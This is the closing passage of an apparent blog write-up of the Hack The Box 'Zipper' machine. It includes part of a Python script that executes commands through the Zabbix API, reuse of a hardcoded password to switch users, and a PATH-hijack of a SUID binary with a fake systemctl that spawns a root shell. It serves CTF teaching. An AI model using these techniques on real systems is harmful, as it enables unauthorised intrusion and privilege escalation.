		    <span class="s">"scriptid"</span><span class="p">:</span> <span class="s">"1"</span><span class="p">,</span>
		    <span class="s">"hostid"</span><span class="p">:</span> <span class="s">""</span><span class="o">+</span><span class="n">hostid</span><span class="o">+</span><span class="s">""</span>
		<span class="p">},</span>
		<span class="s">"auth"</span> <span class="p">:</span> <span class="n">auth</span><span class="p">[</span><span class="s">'result'</span><span class="p">],</span>
		<span class="s">"id"</span> <span class="p">:</span> <span class="mi">0</span><span class="p">,</span>
		<span class="s">"execute_on"</span> <span class="p">:</span> <span class="s">"1"</span>
	<span class="p">}</span>

	<span class="n">cmd_exe</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">json</span><span class="p">.</span><span class="n">dumps</span><span class="p">(</span><span class="n">payload</span><span class="p">),</span> <span class="n">headers</span><span class="o">=</span><span class="p">(</span><span class="n">headers</span><span class="p">))</span>
	<span class="n">cmd_exe</span> <span class="o">=</span> <span class="n">cmd_exe</span><span class="p">.</span><span class="n">json</span><span class="p">()</span>
<span class="c1">#	print cmd_exe["result"]["value"]
</span>
</code></pre></div></div>
<p>First thing we will notice that we are <code class="language-plaintext highlighter-rouge">zabbix</code> and in <code class="language-plaintext highlighter-rouge">/home</code> there’s a directory for the user <code class="language-plaintext highlighter-rouge">zapper</code> 
<br><img src="/images/hackthebox/zipper/25.png" alt="" class="align-center"><br><br>
We can’t read <code class="language-plaintext highlighter-rouge">user.txt</code> and we can’t go into <code class="language-plaintext highlighter-rouge">.ssh</code>
<br><img src="/images/hackthebox/zipper/26.png" alt="" class="align-center"><br><br>
There’s another directory called <code class="language-plaintext highlighter-rouge">utils</code> which contains 2 files , <code class="language-plaintext highlighter-rouge">backup.sh</code> and <code class="language-plaintext highlighter-rouge">zabbix-service</code>
<code class="language-plaintext highlighter-rouge">cat backup.sh</code>
<br><img src="/images/hackthebox/zipper/28.png" alt="" class="align-center"><br><br>
We see that it has a hardcoded password in it : <code class="language-plaintext highlighter-rouge">ZippityDoDah</code> , we can try to <code class="language-plaintext highlighter-rouge">su</code> to zapper with that password
<br><img src="/images/hackthebox/zipper/29.png" alt="" class="align-center"><br><br>
And it worked , now we can get the ssh key from <code class="language-plaintext highlighter-rouge">.ssh</code> and have ssh connection
<br><img src="/images/hackthebox/zipper/30.png" alt="" class="align-center"><br>
<img src="/images/hackthebox/zipper/31.png" alt="" class="align-center"><br><br>
And we owned user !</p>

<h2 id="privilege-escalation-and-getting-root">Privilege Escalation and getting root</h2>
<p>If we take a look at the <code class="language-plaintext highlighter-rouge">utils</code> directory again and execute <code class="language-plaintext highlighter-rouge">zabbix-service</code> :
<br><img src="/images/hackthebox/zipper/32.png" alt="" class="align-center"><br>
<img src="/images/hackthebox/zipper/33.png" alt="" class="align-center"><br><br>
It asks us start or stop? then it executes something and exits , we will check if that binary is a suid binary : 
<code class="language-plaintext highlighter-rouge">find /home/zapper/utils -perm -4000</code>
<br><img src="/images/hackthebox/zipper/34.png" alt="" class="align-center"><br><br>
It’s a suid binary , we need to know what is it doing. Without reverse engineering , <code class="language-plaintext highlighter-rouge">strings</code> was enough :
<code class="language-plaintext highlighter-rouge">strings zabbix-service</code>
<br><img src="/images/hackthebox/zipper/35.png" alt="" class="align-center"><br><br>
This command is being executed when we type <code class="language-plaintext highlighter-rouge">start</code> : <code class="language-plaintext highlighter-rouge">systemctl daemon-reload &amp;&amp; systemctl start zabbix-agent</code> , so what are we going to do is the same as we did in <a href="/hack-the-box/dab/">Dab</a> , the only difference is in dab we hijacked a shared library that the binary used , but here we will hijack a binary. By default <code class="language-plaintext highlighter-rouge">systemctl</code> points to <code class="language-plaintext highlighter-rouge">/bin/systemctl</code>
<br><img src="/images/hackthebox/zipper/36.png" alt="" class="align-center"><br><br>
We will create a <code class="language-plaintext highlighter-rouge">c</code> program to execute <code class="language-plaintext highlighter-rouge">/bin/bash</code> :
<br><img src="/images/hackthebox/zipper/37.png" alt="" class="align-center"><br><br>
Then we will compile it with gcc : <code class="language-plaintext highlighter-rouge">gcc exploit.c -o systemctl</code>
Now we have our fake binary ready : 
<br><img src="/images/hackthebox/zipper/38.png" alt="" class="align-center"><br><br>
We will add <code class="language-plaintext highlighter-rouge">/home/zapper/utils</code> as the first entry in <code class="language-plaintext highlighter-rouge">PATH</code> env variable , so the system will look there first : 
<code class="language-plaintext highlighter-rouge">export PATH=/home/zapper/utils:$PATH</code>
This is changing the <code class="language-plaintext highlighter-rouge">PATH</code> variable to <code class="language-plaintext highlighter-rouge">/home/zapper/utils:</code> + the old path 
<br><img src="/images/hackthebox/zipper/39.png" alt="" class="align-center"><br><br>
Now <code class="language-plaintext highlighter-rouge">systemctl</code> points to our fake binary , let’s run <code class="language-plaintext highlighter-rouge">zabbix-service</code> :
<br><img src="/images/hackthebox/zipper/40.png" alt="" class="align-center"><br><br>
And we owned root !</p>

<p><br>That’s it , Feedback is appreciated !
<br>Don’t forget to read the <a href="/categories">previous write-ups</a> , Tweet about the write-up if you liked it , follow on twitter <a href="https://twitter.com/Ahm3d_H3sham" target="_blank" rel="noopener noreferrer">@Ahm3d_H3sham</a>
<br>Thanks for reading.<br></p>

<p>Previous Hack The Box write-up : <a href="/hack-the-box/giddy/">Hack The Box - Giddy</a>
<br>Next Hack The Box write-up : <a href="/hack-the-box/access/">Hack The Box - Access</a></p>


        
      </section>

      <footer class="page__meta">
        
        


        

  <p class="page__date"><strong><i class="fas fa-fw fa-calendar-alt" aria-hidden="true"></i> Updated:</strong> <time datetime="2019-02-23T07:00:00+02:00">February 23, 2019</time></p>


      </footer>

      

      
  <nav class="pagination">
    
      <a href="/pwn/fd/" class="pagination--pager" title="pwnable.kr - fd
">Previous</a>
    
    
      <a href="/hack-the-box/access/" class="pagination--pager" title="Hack The Box - Access
">Next</a>
    
  </nav>

    </div>

    
  </article>

  
  
</div>
    </div>

    

    <div id="footer" class="page__footer">
      <footer>
        <!-- start custom footer snippets -->

<!-- end custom footer snippets -->
        <div class="page__footer-follow">
    <ul class="social-icons">
      
  
      
  
      
    </ul>
  </div>
      </footer>
    </div>

    
  <script src="/assets/js/main.min.js"></script>







  <!-- Global site tag (gtag.js) - Google Analytics -->
<script async src="https://www.googletagmanager.com/gtag/js?id=UA-97164925-2"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'UA-97164925-2', { 'anonymize_ip': false});
</script>









  </body>
</html>
